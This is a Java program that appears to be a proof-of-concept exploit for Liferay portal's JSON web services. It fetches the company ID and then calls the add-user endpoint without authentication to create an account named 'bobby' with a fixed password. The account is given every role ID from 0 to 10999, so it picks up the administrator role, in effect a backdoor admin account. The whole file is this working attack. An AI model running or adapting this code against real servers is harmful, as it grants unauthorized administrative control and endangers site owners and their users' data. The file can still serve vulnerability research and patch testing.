package nl.orange11.liferay;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import org.apache.commons.httpclient.HostConfiguration;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.PostMethod;

import java.io.IOException;
import java.util.Collection;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;

public class Main {

    private static final String LIFERAY_HOST = "localhost";
    private static final int LIFERAY_PORT = 8080;

    private static final String SCREEN_NAME = "bobby";
    private static final String EMAIL_ADDRESS = "bobby@tables.nl";
    private static final String PASSWORD = "s3cr3t";

    public static void main(String[] args) throws Exception {
        HttpClient client = new HttpClient();

        HostConfiguration hostConfiguration = new HostConfiguration();
        hostConfiguration.setHost(LIFERAY_HOST, LIFERAY_PORT);

        long companyId = getCompanyIdByVirtualHost(client, hostConfiguration, hostConfiguration.getHost());

        // you cannot fetch a role by name to get to the id so lets just assign any possible role, id's don't seem to
        // go past 11000 on a clean install so stop there it should also include the admin role, you may have to
        // increase this number if the admin created his own admin role afterwards

        Set<Long> roles = new HashSet<Long>();
        for (long i = 0; i < 11000; i++) {
            roles.add(i);
        }

        addUser(client, hostConfiguration, companyId, EMAIL_ADDRESS, SCREEN_NAME, PASSWORD, roles);
    }

    private static long getCompanyIdByVirtualHost(HttpClient client, HostConfiguration hostConfiguration, String host)
            throws IOException {

        PostMethod method = new PostMethod("/api/jsonws/company/get-company-by-virtual-host");
        try {
            method.addParameter("virtualHost", host);

            client.executeMethod(hostConfiguration, method);

            String responseBody = method.getResponseBodyAsString();

            JsonParser parser = new JsonParser();
            JsonObject object = (JsonObject) parser.parse(responseBody);
            return object.get("companyId").getAsLong();
        } finally {
            method.releaseConnection();
        }
    }

    private static void addUser(HttpClient client, HostConfiguration hostConfiguration, long companyId,
                                String emailAddress, String screenName, String password, Collection<Long> roles)
            throws IOException {

        PostMethod method = new PostMethod("/api/jsonws/user/add-user");
        method.addParameter("companyId", String.valueOf(companyId));
        method.addParameter("autoPassword", "false");
        method.addParameter("password1", password);
        method.addParameter("password2", password);
        method.addParameter("autoScreenName", "false");
        method.addParameter("screenName", screenName);
        method.addParameter("emailAddress", emailAddress);
        method.addParameter("facebookId", "0");
        method.addParameter("openId", "");
        method.addParameter("locale", "en_US");
        method.addParameter("firstName", "jelmer");
        method.addParameter("middleName", "j");
        method.addParameter("lastName", "kuperus");
        method.addParameter("prefixId", "0");
        method.addParameter("suffixId", "0");
        method.addParameter("male", "true");
        method.addParameter("birthdayMonth", "2");
        method.addParameter("birthdayDay", "29");
        method.addParameter("birthdayYear", "1980");
        method.addParameter("jobTitle", "1337 h4x0r");
        method.addParameter("groupIds", "");
        method.addParameter("organizationIds", "");
        method.addParameter("roleIds", toCommaDelimitedList(roles));
        method.addParameter("userGroupIds", "");
        method.addParameter("sendEmail", "false");
        try {
            client.executeMethod(hostConfiguration, method);

        } finally {
            method.releaseConnection();
        }
    }

    private static String toCommaDelimitedList(Collection<Long> collection) {

        StringBuilder builder = new StringBuilder();

        for (Iterator<Long> iterator = collection.iterator(); iterator.hasNext(); ) {
            Long next = iterator.next();

            builder.append(next);
            if (iterator.hasNext()) {
                builder.append(",");
            }
        }
        return builder.toString();
    }

}
